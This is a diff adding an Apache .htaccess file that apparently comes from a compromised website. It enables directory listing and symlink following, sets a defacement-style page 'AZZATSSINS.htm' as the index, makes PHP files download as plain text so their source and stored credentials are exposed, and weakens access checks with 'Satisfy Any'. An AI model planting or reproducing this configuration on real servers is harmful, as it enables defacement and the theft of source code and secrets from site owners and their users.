@@ -1,0 +1,5 @@
+Options Indexes FollowSymLinks
+DirectoryIndex AZZATSSINS.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
